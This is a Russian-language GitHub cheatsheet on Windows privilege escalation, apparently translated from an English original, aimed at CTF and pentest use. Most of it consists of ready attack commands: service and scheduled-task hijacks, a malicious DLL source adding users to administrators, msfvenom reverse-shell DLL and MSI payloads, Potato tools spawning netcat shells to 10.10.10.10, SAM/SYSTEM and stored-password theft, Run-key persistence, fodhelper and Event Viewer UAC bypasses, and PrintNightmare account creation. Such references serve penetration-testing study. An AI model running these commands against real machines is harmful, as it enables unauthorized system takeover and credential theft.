<a id="-windows-privilege-escalation---complete-cheatsheet"></a>
# 🪟 Повышение привилегий в Windows — полный справочник

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="Windows PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/SYSTEM-Access-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Полное руководство по повышению привилегий в Windows</b>
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Сбор сведений](#-enumeration)
- [Эксплуатация служб](#-service-exploitation)
- [Пути служб без кавычек](#-unquoted-service-paths)
- [Перехват загрузки DLL](#-dll-hijacking)
- [AlwaysInstallElevated](#-alwaysinstallelevated)
- [Сохранённые учётные данные](#-stored-credentials)
- [Работа с токенами доступа](#-token-manipulation)
- [Атаки семейства Potato](#-potato-attacks)
- [Эксплуатация настроек реестра](#-registry-exploits)
- [Запланированные задачи](#-scheduled-tasks)
- [Обход UAC](#-uac-bypass)
- [Эксплойты ядра](#-kernel-exploits)
- [Краткий справочник](#-quick-reference)

---

<a id="-enumeration"></a>
## 🔍 Сбор сведений

> **О версиях и синтаксисе.** [WMIC устарел](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic) и может отсутствовать в новых системах. [Get-WmiObject отсутствует в PowerShell 7](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell); это не отменяет саму инфраструктуру WMI. Get-ModifiableService ниже — функция стороннего [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc), а не встроенная команда. Строки с # в блоках cmd — пояснения оригинала, а не исполняемые комментарии cmd.exe. Все команды сохранены дословно.


<a id="system-information"></a>
### Сведения о системе

```cmd
# Сведения о системе
systeminfo
hostname

# Версия ОС
ver
wmic os get caption,version,buildnumber

# Архитектура
echo %PROCESSOR_ARCHITECTURE%

# Обновления и исправления
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

<a id="user-information"></a>
### Сведения о пользователях

```cmd
# Текущий пользователь
whoami
whoami /all
whoami /priv
whoami /groups

# Все пользователи
net user
net localgroup administrators

# Подробные сведения о пользователе
net user username

# Текущие привилегии
whoami /priv
```

<a id="network-information"></a>
### Сведения о сети

```cmd
# Настройки IP
ipconfig /all

# Маршруты
route print

# Открытые порты
netstat -ano
netstat -an | findstr LISTENING

# Таблица ARP
arp -a

# Кеш DNS
ipconfig /displaydns
```

<a id="process--services"></a>
### Процессы и службы

```cmd
# Запущенные процессы
tasklist
tasklist /svc
wmic process list full

# Службы
sc query
net start
wmic service list brief

# Драйверы
driverquery
```

<a id="powershell-enumeration"></a>
### Сбор сведений через PowerShell

```powershell
# Сведения о системе
Get-ComputerInfo

# Пользователи
Get-LocalUser
Get-LocalGroupMember Administrators

# Службы
Get-Service

# Процессы
Get-Process

# Установленное ПО
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

<a id="-service-exploitation"></a>
## ⚙️ Эксплуатация служб

<a id="find-vulnerable-services"></a>
### Поиск потенциально уязвимых служб

```cmd
# Перечислить службы
sc query state= all

# Права доступа к службам
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Проверить конкретную службу
sc qc servicename
```

<a id="weak-service-permissions"></a>
### Недостаточная защита настроек службы

```cmd
# Если можно изменить конфигурацию службы:
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc config servicename binpath= "net localgroup administrators user /add"
sc stop servicename
sc start servicename
```

<a id="weak-service-binary-permissions"></a>
### Недостаточная защита исполняемого файла службы

```cmd
# Проверить права доступа к исполняемому файлу
icacls "C:\Program Files\Service\binary.exe"

# Если файл доступен для записи, заменить его вредоносным
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servicename
sc start servicename
```

<a id="powershell-service-check"></a>
### Проверка служб через PowerShell

```powershell
# Получить сведения о службах
Get-WmiObject win32_service | Select-Object Name, StartName, PathName

# Найти службы с изменяемой конфигурацией
Get-ModifiableService
```

---

<a id="-unquoted-service-paths"></a>
## 📂 Пути служб без кавычек

> **Уточнение.** Наличие пробелов и отсутствие кавычек — только предпосылки: важны права службы, доступ на запись в реально проверяемое расположение и возможность запуска или перезапуска. В [порядке поиска DLL Microsoft](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) также учитываются дополнительные факторы и SafeDllSearchMode; краткий список ниже неполон.


<a id="find-unquoted-paths"></a>
### Поиск путей без кавычек

```cmd
# Найти пути служб без кавычек
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

<a id="exploit-unquoted-path"></a>
### Эксплуатация пути без кавычек

```
# Если путь имеет вид: C:\Program Files\Vulnerable Service\service.exe
# Windows проверяет следующие варианты:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# Разместить вредоносный exe-файл:
copy shell.exe "C:\Program Files\Vulnerable.exe"

# Перезапустить службу
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

<a id="-dll-hijacking"></a>
## 📚 Перехват загрузки DLL

<a id="find-missing-dlls"></a>
### Поиск отсутствующих DLL

```cmd
# Использовать Process Monitor для поиска отсутствующих DLL
# Фильтр: Result = NAME NOT FOUND, Path заканчивается на .dll

# Типичные проверяемые расположения:
# 1. Каталог приложения
# 2. C:\Windows\System32
# 3. C:\Windows
# 4. Текущий каталог
# 5. Каталоги из PATH
```

<a id="create-malicious-dll"></a>
### Создание вредоносной DLL

```c
// Полезная нагрузка msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

// Либо скомпилировать собственную DLL:
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

<a id="exploit"></a>
### Эксплуатация

```cmd
# Скопировать DLL в доступный для записи каталог из пути поиска
copy evil.dll "C:\Program Files\App\missing.dll"

# Вызвать загрузку DLL приложением
# Перезапустить службу или приложение
```

---

<a id="-alwaysinstallelevated"></a>
## 📦 AlwaysInstallElevated

<a id="check-for-vulnerability"></a>
### Проверка условий уязвимости

```cmd
# Оба значения должны быть установлены в 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

<a id="exploit-1"></a>
### Эксплуатация

```bash
# Создать вредоносный MSI-пакет
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Передать и запустить
msiexec /quiet /qn /i evil.msi
```

---

<a id="-stored-credentials"></a>
## 🔑 Сохранённые учётные данные

> **Уточнение.** Прямое копирование активных SAM/SYSTEM может не сработать из-за блокировок. SYSTEM или SeBackupPrivilege сами по себе не отменяют [ограничения совместного доступа к открытому файлу](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew). Backup/Restore-привилегии не означают безусловного доступа «к любому файлу» при любом способе открытия; исходные примеры сохранены.


<a id="credential-manager"></a>
### Диспетчер учётных данных

```cmd
# Перечислить сохранённые учётные данные
cmdkey /list

# Использовать сохранённые учётные данные
runas /savecred /user:Administrator cmd.exe
```

<a id="sam--system"></a>
### SAM и SYSTEM

```cmd
# Скопировать файлы SAM (в оригинале указано требование SYSTEM; см. уточнение)
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# Из теневых копий
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

<a id="registry-credentials"></a>
### Учётные данные в реестре

```cmd
# Пароли автоматического входа
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Пароли VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Сеансы PuTTY
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

<a id="files-with-passwords"></a>
### Файлы с паролями

```cmd
# Поиск паролей
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# Файлы автоматической установки
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# История PowerShell
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Конфигурация IIS
type C:\inetpub\wwwroot\web.config
```

<a id="wifi-passwords"></a>
### Пароли Wi-Fi

```cmd
# Перечислить профили
netsh wlan show profiles

# Получить пароль
netsh wlan show profile name="SSID" key=clear
```

---

<a id="-token-manipulation"></a>
## 🎭 Работа с токенами доступа

<a id="check-privileges"></a>
### Проверка привилегий

```cmd
whoami /priv

# Привилегии, которые могут иметь опасные последствия:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

<a id="seimpersonateprivilege"></a>
### SeImpersonatePrivilege

```cmd
# Если SeImpersonatePrivilege включена:
# Использовать атаки Potato (JuicyPotato, PrintSpoofer и другие)

# PrintSpoofer
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

<a id="sebackupprivilege"></a>
### SeBackupPrivilege

```cmd
# Может позволять чтение файлов с обходом ACL (упрощение оригинала; см. уточнение)
# Скопировать SAM и SYSTEM
robocopy /b C:\Windows\System32\config C:\Users\Public SAM SYSTEM
```

<a id="serestoreprivilege"></a>
### SeRestorePrivilege

```cmd
# Может позволять запись с обходом ACL (упрощение оригинала; см. уточнение)
# Заменить системные файлы
```

---

<a id="-potato-attacks"></a>
## 🥔 Атаки семейства Potato

> **О совместимости.** В [официальном обсуждении JuicyPotato](https://github.com/ohpe/juicy-potato/issues/4) автор подтверждает, что Windows 10 1809 и Server 2019 исправлены для исходного инструмента. Заголовки с версиями ниже перенесены из оригинала и не гарантируют работоспособность: важны сборка, обновления, службы и доступные привилегии.


<a id="juicypotato-windows-server-20162019"></a>
### JuicyPotato (Windows Server 2016/2019)

```cmd
# Требуется SeImpersonatePrivilege или SeAssignPrimaryToken
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

<a id="printspoofer-windows-10server-2016"></a>
### PrintSpoofer (Windows 10/Server 2016+)

```cmd
# Требуется SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.10.10 4444 -e cmd"
```

<a id="roguepotato"></a>
### RoguePotato

```cmd
RoguePotato.exe -r 10.10.10.10 -e "cmd /c whoami > C:\Users\Public\out.txt" -l 9999
```

<a id="godpotato-windows-1011server-2019-2022"></a>
### GodPotato (Windows 10/11/Server 2019-2022)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

---

<a id="-registry-exploits"></a>
## 📝 Эксплуатация настроек реестра

<a id="autoruns"></a>
### Автоматический запуск

```cmd
# Проверить расположения автоматического запуска
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Если доступна запись, добавить вредоносную запись
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

<a id="service-registry-keys"></a>
### Ключи служб в реестре

```cmd
# Проверить права доступа к ключам служб в реестре
accesschk.exe -kvuqws "Everyone" HKLM\System\CurrentControlSet\Services

# Изменить значение ImagePath службы
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnerable" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

<a id="-scheduled-tasks"></a>
## ⏰ Запланированные задачи

<a id="list-scheduled-tasks"></a>
### Перечисление запланированных задач

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

<a id="find-writable-task-scripts"></a>
### Поиск доступных для изменения сценариев задач

```cmd
# Если задача запускает сценарий, который можно изменить:
icacls "C:\Scripts\backup.bat"

# Добавить вредоносную команду
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

<a id="create-malicious-task"></a>
### Создание вредоносной задачи

```cmd
# Если есть разрешение на создание задач
schtasks /create /tn "Evil" /tr "C:\Users\Public\shell.exe" /sc onlogon /ru SYSTEM
```

---

<a id="-uac-bypass"></a>
## 🛡️ Обход UAC

> **Уточнение.** [UAC различает стандартный и административный токены](https://learn.microsoft.com/en-us/windows-server/security/user-account-control/how-user-account-control-works). Обход запроса подтверждения UAC не равнозначен получению административных прав обычным пользователем; примеры зависят от контекста учётной записи, настроек и сборки Windows.


<a id="check-uac-level"></a>
### Проверка уровня UAC

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

<a id="fodhelper-bypass"></a>
### Обход через fodhelper

```cmd
# Работает в некоторых конфигурациях Windows 10 (формулировка оригинала; см. уточнение)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# Удалить внесённые изменения
reg delete HKCU\Software\Classes\ms-settings /f
```

<a id="eventviewer-bypass"></a>
### Обход через Event Viewer

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

<a id="-kernel-exploits"></a>
## 💣 Эксплойты ядра

> **Уточнение к таблице.** Здесь смешаны разные классы уязвимостей, а All не означает каждую сборку Windows. Например, [Microsoft описывает CVE-2021-34527 как уязвимость службы Print Spooler](https://www.microsoft.com/en-us/msrc/blog/2021/07/clarified-guidance-for-cve-2021-34527-windows-print-spooler-vulnerability), а не просто версии ядра. Наличие запущенной Spooler само по себе не подтверждает уязвимость; обновления и настройки имеют значение. PowerShell-команды в блоках cmd требуют соответствующей оболочки. Значения и примеры оригинала сохранены.


<a id="check-system-info"></a>
### Проверка сведений о системе

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

<a id="common-exploits"></a>
### Распространённые эксплойты

| CVE | Версия Windows | Название |
|-----|-----------------|------|
| MS08-067 | XP/2003 | NetAPI |
| MS16-032 | 7/8/10/2012 | Secondary Logon |
| MS17-010 | Все | **EternalBlue** |
| CVE-2020-0796 | 10/Server 2019 | **SMBGhost** |
| CVE-2021-1732 | 10/Server | Win32k |
| CVE-2021-34527 | Все | **PrintNightmare** |

<a id="printnightmare-cve-2021-34527"></a>
### PrintNightmare (CVE-2021-34527)

```cmd
# Проверить наличие предпосылок уязвимости
Get-Service Spooler

# Эксплуатация (PowerShell)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "password123!" -DriverName "Xerox"
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="one-liner-enumeration"></a>
### Сбор сведений одной строкой

```cmd
# Краткие сведения
whoami /all & systeminfo & net user

# Проверить привилегии
whoami /priv

# Службы
wmic service get name,pathname | findstr /i /v "c:\windows"

# Запланированные задачи
schtasks /query /fo LIST /v | findstr /i "taskname\|run"
```

<a id="automated-tools"></a>
### Инструменты автоматизации

| Инструмент | Описание |
|------|-------------|
| **WinPEAS** | Подробный сбор сведений |
| **PowerUp** | Повышение привилегий средствами PowerShell |
| **Seatbelt** | Проверки безопасности |
| **SharpUp** | Проверки повышения привилегий на C# |

<a id="quick-wins-checklist"></a>
### Список первоочередных проверок

- [ ] `whoami /priv` — проверить SeImpersonate
- [ ] Пути служб без кавычек
- [ ] Исполняемые файлы служб, доступные для записи
- [ ] AlwaysInstallElevated
- [ ] Сохранённые учётные данные (cmdkey /list)
- [ ] Пароли автоматического входа в реестре
- [ ] Недостаточная защита настроек служб
- [ ] Сценарии запланированных задач
- [ ] Версия ядра — PrintNightmare? (см. уточнение)

---

<a id="-resources"></a>
## 📚 Ресурсы

- [LOLBAS](https://lolbas-project.github.io/)
- [Повышение привилегий Windows в HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

<a id="related-cheatsheets"></a>
### Связанные справочники
- [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- [Повышение привилегий Linux](../../Linux-PrivEsc/translations/README.ru.md)

---

<p align="center">
  <b>🪟 Получите права SYSTEM!</b><br>
  <i>Освойте повышение привилегий в Windows</i>
</p>
